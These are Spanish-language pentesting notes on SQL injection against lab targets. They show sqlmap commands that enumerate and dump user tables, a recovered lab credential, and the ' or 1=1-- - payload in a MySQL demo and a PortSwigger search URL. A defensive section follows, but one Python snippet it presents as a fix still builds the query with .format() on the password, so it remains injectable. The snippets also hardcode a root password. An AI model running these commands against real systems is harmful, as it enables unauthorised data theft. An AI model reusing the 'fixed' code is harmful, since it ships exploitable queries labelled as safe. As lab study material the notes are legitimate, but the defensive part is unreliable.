Hay dos formas de hacer este ataque, de forma manual o de forma automática, por tanto lo haremos de ambar maneras.
### SQL Injection Manual

**CONOCER LA BASE DE DATOS ACTUAL**:
![[Pasted image 20240613001316.png]]


Y ya lo tenemos:

![[Pasted image 20240613001322.png]]

**BUSCAR OTRAS BASES DE DATOS ADEMÁS DE LA ACTUAL**

![[Pasted image 20240613001326.png]]

Y se nos muestran otras bases de datos:

![[Pasted image 20240613001329.png]]

**CONOCER TABLAS DE UNA BASE DE DATOS**

![[Pasted image 20240613001333.png]]

Y una vez hecho esto podemos ver como la tabla se llama registration:

![[Pasted image 20240613001340.png]]

**CONOCER LAS COLUMNAS DE UNA BASE DE DATOS**

![[Pasted image 20240613001358.png]]

Y este es el resultado:

![[Pasted image 20240613001406.png]]

**CONOCER LOS REGISTROS DE UNA BASE DE DATOS**

![[Pasted image 20240613001412.png]]

Y nos sale esta información, la cual vamos a guardar por si acaso:

![[Pasted image 20240613001418.png]]
## SQL Injection Automática con SQLmap
Ahora en este punto vamos a utilizar sqlmap para obtener las credenciales para acceder, pero debemos hacerlo en el login del principio:
![[Pasted image 20240613001431.png]]

Para ello interceptamos la petición con burpsuite y guardamos el contenido de la petición en un documento .txt:
![[Pasted image 20240613001439.png]]

Lo pasamos a un bloc de notas:
![[Pasted image 20240613001516.png]]

Y ahora ejecutamos este primer comando con sqlmap para conocer las bases de datos:
![[Pasted image 20240613001530.png]]

Y ya tenemos las dos bases de datos:
![[Pasted image 20240613001538.png]]

Ahora vamos a conocer las tablas de la base de datos main:
![[Pasted image 20240613001551.png]]

Y nos encontró estas 3 tablas, que la interesante es la de user:
![[Pasted image 20240613001654.png]]

Ahora vamos a acceder a las columnas de la tabla users:
![[Pasted image 20240613001703.png]]

Y ya tenemos el resultado:
![[Pasted image 20240613001710.png]]

Y ahora vamos a acceder a los registros de cada una de estas columnas:
![[Pasted image 20240613001714.png]]

Y nos encontró esta credencial, aunque viene hasheada:
![[Pasted image 20240613001719.png]]

## OPCIÓN 2 CON SQLMAP
Por ejemplo tenemos este panel de login de la máquina [[MAQUINA SHOP (Fuzzing, SQLi con sqlmap, escalada de privilegios en Linux con linpeas, perl y gtfobins)]]
![[Pasted image 20240613001753.png]]


En este punto, podemos probar si esto es vulnerable a una sql injection con sqlmap con este parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms --dbs --batch
```

Y tenemos estas bases de datos:
![[Pasted image 20240613001805.png]]

Ahora vamos a atacar a la base de datos webapp, donde si queremos ver las tablas con sqlmap, debemos usar el siguiente parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp --tables --batch
```

Y vemos la tabla users:
![[Pasted image 20240613001819.png]]

Ahora para ver las columnas de la tabla Users, lo haríamos de la siguiente forma:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp -T Users --columns --batch
```

![[Pasted image 20240613001831.png]]

Y ahora para ver todos estos registros con los usuarios y contraseñas, lo haríamos con el siguiente parámetro:
```bash
sqlmap -u http://192.168.0.38/administrator/ --forms -D Webapp -T Users -C password,id,username --dump --batch
```

![[Pasted image 20240613001920.png]]

Por tanto ahora vamos a probar en acceder por ssh con el usuario bart y contraseña b4rtp0w4:
```bash
bart:b4rtp0w4
### Funcionamiento de SQL Injection Explicada desde MySQL
Vamos a mostrar el funcionamiento de una SQL injection desde MySQL para entenderlo mejor, por tanto creamos una base de datos llamada users:
```python
CREATE DATABASE users;
```
Y ahora creamos una tabla llamada acceso:
```python
CREATE TABLE acceso (
  id_usuario INT NOT NULL AUTO_INCREMENT,
  usuario VARCHAR(50) NOT NULL,
  contraseña VARCHAR(50) NOT NULL,
  PRIMARY KEY (id_usuario)
);
```
Ahora creamos 2 usuarios, uno penguin y otro mario, donde en ambos se va a guardar las credenciales de acceso:
```python
INSERT INTO acceso (id_usuario, usuario, contraseña)
VALUES
(1, 'mario', 'megastrongpassword'),
(2, 'penguin', 'megapenguinhack123');
```
Y ahora si hacemos un select * from acceso, veremos que ya tenemos estos dos usuarios insertados:
![[Pasted image 20240613002000.png]]

Vamos ahora a hacer una consulta de tal forma que vamos a simular cómo funcionaría dentro de un panel de login de una web, de tal forma que veremos el funcionamiento de una SQL injection. Por tanto así sería como se efectúa una consulta de forma normal dentro de un panel de login de una página web:
```mysql
select * from acceso WHERE usuario='mario' AND contraseña='megastrongpassword';
```

![[Pasted image 20240613002012.png]]

Y así es lo que ocurriría si a través de una SQL injection queremos ver toda la información:
```javascript
select * from acceso WHERE usuario='mario' or 1=1-- - AND contraseña='no lo se';
```
Y lo que va a ocurrir es que poniendo este ' or 1=1-- - se va a corromper la consulta y nos va a mostrar todo el contenido de la base de datos:
![[Pasted image 20240613002032.png]]

### CÓMO EVITAR SQL INJECTION
En primer lugar, tenemos este código donde conectamos la base de datos con Python:
```python
import mysql.connector

conexion = mysql.connector.connect(user="root", password="124816mario",

                                    host="localhost",
                                    database="users",
                                    port="3306",)

miCursor = conexion.cursor()

sql = "SELECT * FROM acceso"

miCursor.execute(sql)

myresult = miCursor.fetchall()

for x in myresult:
  print(x)
```

![[Pasted image 20240613002046.png]]

Y como vemos este código es vulnerable a una SQL injection:
![[Pasted image 20240613002051.png]]

Si queremos evitar la inyección SQL debemos utilizar un %s para establecer la posición de la variable que recibe el campo de username; y de esta forma no va a interpretar el ' or 1=1-- -':
```python
import mysql.connector

conexion = mysql.connector.connect(user="root", password="124816mario",
                                    host="localhost",
                                    database="users",
                                    port="3306")

usuario = input("Inserta usuario: ")
password = input("Inserta contraseña: ")

miCursor = conexion.cursor()

# Debes colocar una coma después de la variable "mario" para convertirla en una tupla
sql = "SELECT * FROM acceso WHERE usuario = %s AND contraseña = '{}'".format(password)
username = (usuario,)

miCursor.execute(sql, username)

myresult = miCursor.fetchall()

for x in myresult:
    print(x)
```
Por tanto ahora si ejecutamos esto, al poner el intento de inyección SQL en el input, veremos que no va a funcionar y no nos va a sacar nada:

![[Pasted image 20240613002108.png]]

Y no nos devuelve nada:
![[Pasted image 20240613002113.png]]

Y también podemos limpiar las inyecciones SQL utilizando expresiones regulares, por ejemplo de esta forma:
```python
import mysql.connector
import re

conexion = mysql.connector.connect(user="root", password="124816mario",
                                    host="localhost",
                                    database="users",
                                    port="3306")

usuario = input("Inserta usuario: ")
password = input("Inserta contraseña: ")

sql_injection_regex = re.compile(r"['\";:\-\(\)\{\}\[\]\<\>\*\=\+`%]")
usuario_limpio = sql_injection_regex.sub("", usuario) # En la variable usuario_limpio se guarda el usuario guardado pero quitando los símbolos de sql injection que pueda haber.

miCursor = conexion.cursor()

sql = "SELECT * FROM acceso WHERE usuario = %s AND contraseña = %s"

# Los parámetros se pasan como una tupla
params = (usuario_limpio, password)

miCursor.execute(sql, params)

myresult = miCursor.fetchall()

for x in myresult:
    print(x)

# Se cierra la conexión a la base de datos
conexion.close()
```
### SQL INJECTION EN BARRA DE BÚSQUEDA DE UNA WEB
También podemos efectuar ataques SQL injection dentro de la barra de búsqueda de una página web. Por ejemplo supongamos que tenemos esta página web que se trata de un laboratorio de portswigger:

![[Pasted image 20240613002126.png]]

Aquí nos encontramos con esta url:
![[Pasted image 20240613002154.png]]

Podemos ver que el FOOD & DRINK se encuentra url encodeado, por lo que podemos probar en insertar una SQL injection ' or 1=1-- -, pero hay que hacerlo url encodeado, por lo que abrimos burp suite y lo convertimos:
![[Pasted image 20240613002200.png]]

Y ahora pegamos esto en la URL y habremos explotado una SQL injection, donde estamos mostrando toda la información de la base de datos de la página web:
![[Pasted image 20240613002205.png]]

![[Pasted image 20240613002209.png]]
